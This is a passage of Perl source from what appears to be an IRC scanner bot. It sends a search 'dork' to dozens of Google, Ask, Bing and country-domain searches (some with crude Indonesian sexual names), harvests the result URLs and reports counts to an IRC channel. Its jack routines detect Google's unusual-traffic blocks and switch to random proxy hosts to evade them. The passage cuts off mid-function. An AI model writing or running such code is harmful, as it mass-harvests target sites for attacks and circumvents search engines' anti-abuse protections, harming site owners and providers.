    if ($engine eq "Cuba") { my @cuba = &jack18($dork."+site:cu"); push(@total,@cuba);sleep(3); }

    if ($engine eq "Cyprus") { my @cyprus = &jack19($dork."+site:cy"); push(@total,@cyprus);sleep(3); }

    if ($engine eq "Dominican") { my @dominican = &jack20($dork."+site:dm"); push(@total,@dominican);sleep(3); }

    if ($engine eq "Equador") { my @equador = &jack1($dork."+site:ec"); push(@total,@equador);sleep(3); }

    if ($engine eq "Egypt") { my @egypt = &jack2($dork."+site:eg"); push(@total,@egypt);sleep(3); }

    if ($engine eq "Estonia") { my @estonia = &jack3($dork."+site:ee"); push(@total,@estonia);sleep(3); }

    if ($engine eq "Finland") { my @finland = &jack4($dork."+site:fi"); push(@total,@finland);sleep(3); }

    if ($engine eq "Georgia") { my @georgia = &jack5($dork."+site:ge"); push(@total,@georgia);sleep(3); }

    if ($engine eq "Ghana") { my @ghana = &jack6($dork."+site:gh"); push(@total,@ghana);sleep(3); }

    if ($engine eq "Grenada") { my @grenada = &jack7($dork."+site:gd"); push(@total,@grenada);sleep(3); }

    if ($engine eq "Honduras") { my @honduras = &jack8($dork."+site:hn"); push(@total,@honduras);sleep(3); }

    if ($engine eq "Hongkong") { my @hongkong = &jack9($dork."+site:hk"); push(@total,@hongkong);sleep(3); }

    if ($engine eq "Iceland") { my @iceland = &jack10($dork."+site:is"); push(@total,@iceland);sleep(3); }

    if ($engine eq "Ireland") { my @ireland = &jack12($dork."+site:ie"); push(@total,@ireland);sleep(3); }

    if ($engine eq "Kenya") { my @kenya = &jack13($dork."+site:ke"); push(@total,@kenya);sleep(3); }

    if ($engine eq "Kuwait") { my @kuwait = &jack14($dork."+site:kw"); push(@total,@kuwait);sleep(3); }

    if ($engine eq "Laos") { my @laos = &jack16($dork."+site:la"); push(@total,@laos);sleep(3); }

    if ($engine eq "Latvia") { my @latvia = &jack17($dork."+site:lv"); push(@total,@latvia);sleep(3); }

    if ($engine eq "Liberia") { my @liberia = &jack18($dork."+site:lr"); push(@total,@liberia);sleep(3); }

    if ($engine eq "Libyan") { my @libyan = &jack19($dork."+site:ly"); push(@total,@libyan);sleep(3); }

    if ($engine eq "Lithuania") { my @lithuania = &jack11($dork."+site:lt"); push(@total,@lithuania);sleep(3); }

    if ($engine eq "Macedonia") { my @macedonia = &jack15($dork."+site:mk"); push(@total,@macedonia);sleep(3); }         

    if ($engine eq "Malta") { my @malta = &jack1($dork."+site:mt"); push(@total,@malta);sleep(3); }

    if ($engine eq "Mongolia") { my @mongolia = &jack2($dork."+site:mn"); push(@total,@mongolia);sleep(3); }

    if ($engine eq "Mozambique") { my @mozambique = &jack3($dork."+site:mz"); push(@total,@mozambique);sleep(3); }

    if ($engine eq "Namibia") { my @namibia = &jack4($dork."+site:na"); push(@total,@namibia);sleep(3); }

    if ($engine eq "Nauru") { my @nauru = &jack6($dork."+site:nr"); push(@total,@nauru);sleep(3); }

    if ($engine eq "Nepal") { my @nepal = &jack7($dork."+site:np"); push(@total,@nepal);sleep(3); }

    if ($engine eq "NewZealand") { my @newzealand = &jack8($dork."+site:nz"); push(@total,@newzealand);sleep(3); }

    if ($engine eq "Nigeria") { my @nigeria = &jack9($dork."+site:ng"); push(@total,@nigeria);sleep(3); }

    if ($engine eq "Paraguay") { my @paraguay = &jack10($dork."+site:py"); push(@total,@paraguay);sleep(3); }

    if ($engine eq "Peru") { my @peru = &jack5($dork."+site:pe"); push(@total,@peru);sleep(3); }

    if ($engine eq "Portugal") { my @portugal = &jack11($dork."+site:pt"); push(@total,@portugal);sleep(3); }

    if ($engine eq "PuertoRico") { my @puertorico = &jack12($dork."+site:pr"); push(@total,@puertorico);sleep(3); }

    if ($engine eq "Qatar") { my @qatar = &jack13($dork."+site:qa"); push(@total,@qatar);sleep(3); }     

    if ($engine eq "SaintLucia") { my @saintlucia = &jack14($dork."+site:lc"); push(@total,@saintlucia);sleep(3); }

    if ($engine eq "Samoa") { my @samoa = &jack15($dork."+site:ws"); push(@total,@samoa);sleep(3); }

    if ($engine eq "SaudiArabia") { my @saudiarabia = &jack17($dork."+site:sa"); push(@total,@saudiarabia);sleep(3); }

    if ($engine eq "Senegal") { my @senegal = &jack18($dork."+site:sn"); push(@total,@senegal);sleep(3); }

    if ($engine eq "Slovakia") { my @slovakia = &jack16($dork."+site:sk"); push(@total,@slovakia);sleep(3); }

    if ($engine eq "Srilanka") { my @srilanka = &jack19($dork."+site:lk"); push(@total,@srilanka);sleep(3); }

    if ($engine eq "Swaziland") { my @swaziland = &jack20($dork."+site:sz"); push(@total,@swaziland);sleep(3); }

    if ($engine eq "Tajikistan") { my @tajikistan = &jack1($dork."+site:tj"); push(@total,@tajikistan);sleep(3); }

    if ($engine eq "Tanzania") { my @tanzania = &jack2($dork."+site:tz"); push(@total,@tanzania);sleep(3); }

    if ($engine eq "Tokelau") { my @tokelau = &jack3($dork."+site:tk"); push(@total,@tokelau);sleep(3); }

    if ($engine eq "Tonga") { my @tonga = &jack4($dork."+site:to"); push(@total,@tonga);sleep(3); }

    if ($engine eq "Tunisia") { my @tunisia = &jack5($dork."+site:tn"); push(@total,@tunisia);sleep(3); }        

    if ($engine eq "Uruguay") { my @uruguay = &jack6($dork."+site:uy"); push(@total,@uruguay);sleep(3); }

    if ($engine eq "Uzbekistan") { my @uzbekistan = &jack7($dork."+site:uz"); push(@total,@uzbekistan);sleep(3); }

    if ($engine eq "Venezuela") { my @venezuela = &jack8($dork."+site:ve"); push(@total,@venezuela);sleep(3); }

    if ($engine eq "Yemen") { my @yemen = &jack9($dork."+site:ye"); push(@total,@yemen);sleep(3); }

    if ($engine eq "Yugoslavia") { my @yugoslavia = &jack10($dork."+site:yu"); push(@total,@yugoslavia);sleep(3); }

    if ($engine eq "Zambia") { my @zambia = &jack11($dork."+site:zm"); push(@total,@zambia);sleep(3); }

    if ($engine eq "Uganda") { my @uganda = &jack12($dork."+site:ug"); push(@total,@uganda);sleep(3); }

    if ($engine eq "Trinidad") { my @trinidad = &jack13($dork."+site:tt"); push(@total,@trinidad);sleep(3); }

    if ($engine eq "Zimbabwe") { my @zimbabwe = &jack14($dork."+site:zw"); push(@total,@zimbabwe);sleep(3); }

    if ($engine eq "KonToL") { my @kontol = kontol($dork); push(@total,@kontol);sleep(3); }

    if ($engine eq "PePek") { my @pepek = pepek($dork); push(@total,@pepek);sleep(3); }

    if ($engine eq "TeTek") { my @tetek = tetek($dork); push(@total,@tetek);sleep(3); }

    if ($engine eq "ItiL") { my @itil = itil($dork); push(@total,@itil);sleep(3); }

    if ($engine eq "NenNen") { my @nennen = nennen($dork); push(@total,@nennen);sleep(3); }

    if ($engine eq "SuSu") { my @susu = susu($dork); push(@total,@susu);sleep(3); }

    if ($engine eq "BuahDada") { my @buahdada = buahdada($dork); push(@total,@buahdada);sleep(3); }

    if ($engine eq "PayuDara") { my @payudara = payudara($dork); push(@total,@payudara);sleep(3); }

    if ($engine eq "Kentot") { my @kentot = kentot($dork); push(@total,@kentot);sleep(3); }

    if ($engine eq "eMeL") { my @emel = emel($dork); push(@total,@emel);sleep(3); }

    if ($engine eq "OraL") { my @oral = oral($dork); push(@total,@oral);sleep(3); }

    if ($engine eq "Klitoris") { my @klitoris = klitoris($dork); push(@total,@klitoris);sleep(3); }

    if ($engine eq "Masturbasi") { my @masturbasi = masturbasi($dork); push(@total,@masturbasi);sleep(3); }

    if ($engine eq "Onani") { my @onani = onani($dork); push(@total,@onani);sleep(3); } 

    if ($engine eq "Sperma") { my @sperma = sperma($dork); push(@total,@sperma);sleep(3); }             

    if ($engine eq "AnaL") { my @anal = anal($dork); push(@total,@anal);sleep(3); }

    if ($engine eq "Puting") { my @puting = puting($dork); push(@total,@puting);sleep(3); }     

    if ($engine eq "Vagina") { my @vagina = vagina($dork); push(@total,@vagina);sleep(3); }

    if ($engine eq "Penis") { my @penis = penis($dork); push(@total,@penis);sleep(3); }

    if ($engine eq "MeMek") { my @memek = memek($dork); push(@total,@memek);sleep(3); }

    if ($engine eq "GooGLe") { my @google = &google($dork); push(@total,@google);sleep(3); }

    if ($engine eq "GooGLeCA") { my @googleCA = googleCA($dork); push(@total,@googleCA);sleep(3); }

    if ($engine eq "GooGLeDE") { my @googleDE = googleDE($dork); push(@total,@googleDE);sleep(3); }

    if ($engine eq "GooGLeUK") { my @googleUK = googleUK($dork); push(@total,@googleUK);sleep(3); }

    if ($engine eq "GooGLeFR") { my @googleFR = googleFR($dork); push(@total,@googleFR);sleep(3); }

    if ($engine eq "GooGLeES") { my @googleES = googleES($dork); push(@total,@googleES);sleep(3); }

    if ($engine eq "GooGLeIT") { my @googleIT = googleIT($dork); push(@total,@googleIT);sleep(3); }

    if ($engine eq "GooGLeNL") { my @googleNL = googleNL($dork); push(@total,@googleNL);sleep(3); }

    if ($engine eq "GooGLeBE") { my @googleBE = googleBE($dork); push(@total,@googleBE);sleep(3); }

    if ($engine eq "GooGLeCH") { my @googleCH = googleCH($dork); push(@total,@googleCH);sleep(3); }

    if ($engine eq "GooGLeSE") { my @googleSE = googleSE($dork); push(@total,@googleSE);sleep(3); }

    if ($engine eq "GooGLeDK") { my @googleDK = googleDK($dork); push(@total,@googleDK);sleep(3); }

    if ($engine eq "GooGLeNO") { my @googleNO = googleNO($dork); push(@total,@googleNO);sleep(3); }

    if ($engine eq "GooGLeNZ") { my @googleNZ = googleNZ($dork); push(@total,@googleNZ);sleep(3); }

    if ($engine eq "GooGLeIE") { my @googleIE = googleIE($dork); push(@total,@googleIE);sleep(3); }

    if ($engine eq "GooGLeBR") { my @googleBR = googleBR($dork); push(@total,@googleBR);sleep(3); }

    if ($engine eq "GooGLeAR") { my @googleAR = googleAR($dork); push(@total,@googleAR);sleep(3); }

    if ($engine eq "GooGLeCO") { my @googleCO = googleCO($dork); push(@total,@googleCO);sleep(3); }

    if ($engine eq "GooGLeCU") { my @googleCU = googleCU($dork); push(@total,@googleCU);sleep(3); }

    if ($engine eq "GooGLeCL") { my @googleCL = googleCL($dork); push(@total,@googleCL);sleep(3); }

    if ($engine eq "GooGLeMX") { my @googleMX = googleMX($dork); push(@total,@googleMX);sleep(3); }

    if ($engine eq "GooGLeAU") { my @googleAU = googleAU($dork); push(@total,@googleAU);sleep(3); }

    if ($engine eq "GooGLeRU") { my @googleRU = googleRU($dork); push(@total,@googleRU);sleep(3); }

    if ($engine eq "GooGLeAT") { my @googleAT = googleAT($dork); push(@total,@googleAT);sleep(3); }

    if ($engine eq "GooGLePL") { my @googlePL = googlePL($dork); push(@total,@googlePL);sleep(3); }

    if ($engine eq "GooGLeIL") { my @googleIL = googleIL($dork); push(@total,@googleIL);sleep(3); }

    if ($engine eq "GooGLeTR") { my @googleTR = googleTR($dork); push(@total,@googleTR);sleep(3); }

    if ($engine eq "GooGLeUA") { my @googleUA = googleUA($dork); push(@total,@googleUA);sleep(3); }

    if ($engine eq "GooGLeGR") { my @googleGR = googleGR($dork); push(@total,@googleGR);sleep(3); }

    if ($engine eq "GooGLeJP") { my @googleJP = googleJP($dork); push(@total,@googleJP);sleep(3); }

    if ($engine eq "GooGLeCN") { my @googleCN = googleCN($dork); push(@total,@googleCN);sleep(3); }

    if ($engine eq "GooGLeMY") { my @googleMY = googleMY($dork); push(@total,@googleMY);sleep(3); }

    if ($engine eq "GooGLeTH") { my @googleTH = googleTH($dork); push(@total,@googleTH);sleep(3); }

    if ($engine eq "GooGLeIN") { my @googleIN = googleIN($dork); push(@total,@googleIN);sleep(3); }

    if ($engine eq "GooGLeKR") { my @googleKR = googleKR($dork); push(@total,@googleKR);sleep(3); }

    if ($engine eq "GooGLeRO") { my @googleRO = googleRO($dork); push(@total,@googleRO);sleep(3); }

    if ($engine eq "GooGLeTW") { my @googleTW = googleTW($dork); push(@total,@googleTW);sleep(3); }

    if ($engine eq "GooGLeZA") { my @googleZA = googleZA($dork); push(@total,@googleZA);sleep(3); }

    if ($engine eq "GooGLePT") { my @googlePT = googlePT($dork); push(@total,@googlePT);sleep(3); }

    if ($engine eq "AsKCA") { my @askCA = askCA($dork); push(@total,@askCA);sleep(3); }

    if ($engine eq "AsKDE") { my @askDE = askDE($dork); push(@total,@askDE);sleep(3); }

    if ($engine eq "AsKIT") { my @askIT = askIT($dork); push(@total,@askIT);sleep(3); }

    if ($engine eq "AsKUK") { my @askUK = askUK($dork); push(@total,@askUK);sleep(3); }

    if ($engine eq "AsKFR") { my @askFR = askFR($dork); push(@total,@askFR);sleep(3); }

    if ($engine eq "AsKES") { my @askES = askES($dork); push(@total,@askES);sleep(3); }

    if ($engine eq "AsKRU") { my @askRU = askRU($dork); push(@total,@askRU);sleep(3); }

    if ($engine eq "AsKNL") { my @askNL = askNL($dork); push(@total,@askNL);sleep(3); }

    if ($engine eq "AsKEU") { my @askEU = askEU($dork); push(@total,@askEU);sleep(3); }

    if ($engine eq "AsKPL") { my @askPL = askPL($dork); push(@total,@askPL);sleep(3); }

    if ($engine eq "AsKAT") { my @askAT = askAT($dork); push(@total,@askAT);sleep(3); }

    if ($engine eq "AsKSE") { my @askSE = askSE($dork); push(@total,@askSE);sleep(3); }

    if ($engine eq "AsKDK") { my @askDK = askDK($dork); push(@total,@askDK);sleep(3); }

    if ($engine eq "AsKNO") { my @askNO = askNO($dork); push(@total,@askNO);sleep(3); }

    if ($engine eq "AsKAU") { my @askAU = askAU($dork); push(@total,@askAU);sleep(3); }

    if ($engine eq "AsKBR") { my @askBR = askBR($dork); push(@total,@askBR);sleep(3); }

    if ($engine eq "AsKMX") { my @askMX = askMX($dork); push(@total,@askMX);sleep(3); }

    if ($engine eq "AsKJP") { my @askJP = askJP($dork); push(@total,@askJP);sleep(3); }

    if ($engine eq "BingDE") { my @bingDE = bingDE($dork); push(@total,@bingDE);sleep(3); }

    if ($engine eq "BingUK") { my @bingUK = bingUK($dork); push(@total,@bingUK);sleep(3); }

    if ($engine eq "BingCA") { my @bingCA = bingCA($dork); push(@total,@bingCA);sleep(3); }

    if ($engine eq "BingBR") { my @bingBR = bingBR($dork); push(@total,@bingBR);sleep(3); }

    if ($engine eq "BingFR") { my @bingFR = bingFR($dork); push(@total,@bingFR);sleep(3); }

    if ($engine eq "BingES") { my @bingES = bingES($dork); push(@total,@bingES);sleep(3); }

    if ($engine eq "BingIT") { my @bingIT = bingIT($dork); push(@total,@bingIT);sleep(3); }

    if ($engine eq "BingBE") { my @bingBE = bingBE($dork); push(@total,@bingBE);sleep(3); }

    if ($engine eq "BingNL") { my @bingNL = bingNL($dork); push(@total,@bingNL);sleep(3); }

    if ($engine eq "BingPT") { my @bingPT = bingPT($dork); push(@total,@bingPT);sleep(3); }

    if ($engine eq "BingNO") { my @bingNO = bingNO($dork); push(@total,@bingNO);sleep(3); }

    if ($engine eq "BingDK") { my @bingDK = bingDK($dork); push(@total,@bingDK);sleep(3); }

    if ($engine eq "BingSE") { my @bingSE = bingSE($dork); push(@total,@bingSE);sleep(3); }

    if ($engine eq "BingCH") { my @bingCH = bingCH($dork); push(@total,@bingCH);sleep(3); }

    if ($engine eq "BingNZ") { my @bingNZ = bingNZ($dork); push(@total,@bingNZ);sleep(3); }

    if ($engine eq "BingRU") { my @bingRU = bingRU($dork); push(@total,@bingRU);sleep(3); }

    if ($engine eq "BingJP") { my @bingJP = bingJP($dork); push(@total,@bingJP);sleep(3); }

    if ($engine eq "BingCN") { my @bingCN = bingCN($dork); push(@total,@bingCN);sleep(3); }

    if ($engine eq "BingKR") { my @bingKR = bingKR($dork); push(@total,@bingKR);sleep(3); }

    if ($engine eq "BingMX") { my @bingMX = bingMX($dork); push(@total,@bingMX);sleep(3); }

    if ($engine eq "BingAR") { my @bingAR = bingAR($dork); push(@total,@bingAR);sleep(3); }

    if ($engine eq "BingCL") { my @bingCL = bingCL($dork); push(@total,@bingCL);sleep(3); }

    if ($engine eq "BingAU") { my @bingAU = bingAU($dork); push(@total,@bingAU);sleep(3); }

	

    @clean = clean(@total);
	if (@clean > 0){
    &msg("$channel","$logo15(7@2$engine15)12 Total:4 (".scalar(@total).")12 Clean:4 (".scalar(@clean).")");
    }
    return @clean;
}

#########################################

sub isFound() {
    my $status = 0;
    my $link = $_[0];
    my $reqexp = $_[1];
    my $res = get_content($link);
    if ($res =~ /$reqexp/) { $status = 1 }
    return $status;
}

sub get_content() {
    my $url = $_[0];
    my $ua = LWP::UserAgent->new(agent => $uagent);
    $ua->timeout(20);
    my $req = HTTP::Request->new(GET => $url);
    my $res = $ua->request($req);
    return $res->content;
}


######################################### SEARCH ENGINE

sub jack() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jackx.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}
sub jackx() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jackx.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}



sub jack1() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack1.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $random1[rand(scalar(@random1))];

               $jack1 = $rand1."?q=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack1.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}



 

sub jack2() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack2.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $random2[rand(scalar(@random2))];

               $jack2 = $rand1."?q=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack2.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack3() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack3.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $random3[rand(scalar(@random3))];

               $jack3 = $rand1."?q=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack3.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack4() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack4.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $random4[rand(scalar(@random4))];

               $jack4 = $rand1."?q=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack4.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack5() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack5.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $random5[rand(scalar(@random5))];

               $jack5 = $rand1."?q=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack5.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack6() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack6.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $random6[rand(scalar(@random6))];

               $jack6 = $rand1."?q=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack6.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack7() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack7.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $random7[rand(scalar(@random7))];

               $jack7 = $rand1."?q=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack7.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack8() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack8.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $random8[rand(scalar(@random8))];

               $jack8 = $rand1."?q=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack8.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack9() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack9.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $random9[rand(scalar(@random9))];

               $jack9 = $rand1."?q=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack9.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack10() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack10.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $random10[rand(scalar(@random10))];


               $jack10 = $rand1."?q=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack10.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack11() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack11.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $random11[rand(scalar(@random11))];

               $jack11 = $rand1."?q=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack11.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}



 

sub jack12() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack12.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $random12[rand(scalar(@random12))];

               $jack12 = $rand1."?q=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack12.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack13() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack13.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $random13[rand(scalar(@random13))];

               $jack13 = $rand1."?q=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack13.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack14() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack14.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $random14[rand(scalar(@random14))];

               $jack14 = $rand1."?q=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack14.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack15() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack15.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $random15[rand(scalar(@random15))];

               $jack15 = $rand1."?q=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack15.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack16() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack16.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $random16[rand(scalar(@random16))];

               $jack16 = $rand1."?q=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack16.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack17() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack17.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

